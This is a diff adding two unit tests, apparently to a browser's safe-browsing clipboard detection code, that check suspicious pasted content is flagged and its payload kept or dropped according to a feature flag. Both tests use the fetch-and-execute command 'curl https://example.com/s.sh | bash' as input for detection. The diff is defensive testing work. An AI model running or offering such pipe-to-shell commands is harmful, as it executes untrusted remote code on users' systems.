@@ -4891,4 +4891,24 @@ TEST_F(ClientSideDetectionHostClipboardDataTest, MixedDelimiters) {
   EXPECT_TRUE(data.is_overall_suspicious());
 }
 
+TEST_F(ClientSideDetectionHostClipboardDataTest, IncludeFullPayload) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
+}
+
+TEST_F(ClientSideDetectionHostClipboardDataTest, ExcludeFullPayloadByDefault) {
+  feature_list_.InitAndEnableFeatureWithParameters(
+      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});
+
+  ClipboardExtractedData data =
+      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
+  EXPECT_TRUE(data.is_overall_suspicious());
+  EXPECT_FALSE(data.has_content());
+}
+
 }  // namespace safe_browsing
